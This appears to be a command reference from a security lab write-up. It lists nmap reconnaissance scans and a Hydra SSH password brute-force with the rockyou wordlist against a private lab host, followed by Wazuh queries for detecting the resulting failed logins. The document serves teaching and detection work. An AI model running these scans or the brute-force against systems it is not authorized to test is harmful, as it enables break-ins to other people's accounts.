# Command Reference

Every command used in this lab, in exact execution order, for reproducibility. Copy-paste ready — replace the IP addresses with your own lab's values.

## Connectivity Check

```bash
ping 192.168.239.134
```

## Reconnaissance (Nmap)

```bash
# Default scan - top 1000 ports
nmap 192.168.239.134

# Full port range scan
nmap -p- 192.168.239.134

# Service/version detection on SSH
nmap -sV -p 22 192.168.239.134

# OS detection
nmap -O 192.168.239.134

# Service + script scan combined
nmap -sV -sC -p 22 192.168.239.134

# Aggressive all-in-one scan
nmap -A -p- 192.168.239.134

# SSH algorithm enumeration
nmap --script ssh2-enum-algos 192.168.239.134

# SSH supported authentication methods
nmap --script ssh-auth-methods 192.168.239.134
```

## Exploitation (Hydra)

```bash
# SSH brute-force using rockyou.txt wordlist
hydra -l rushi -P /usr/share/wordlists/rockyou.txt ssh://192.168.239.134 -t 4
```

## Wazuh — Useful Queries

Filters used inside the Wazuh Dashboard's Threat Hunting / Discover module:

```
rule.groups: "authentication_failed"
rule.id: 5760
rule.id: 2502
rule.mitre.id: "T1110.001"
agent.id: 001
```

---

**Note:** All commands were run inside an isolated lab network (`192.168.239.0/24`) against machines owned and controlled by the lab operator. Do not run these tools against any system you do not own or have explicit written authorization to test.
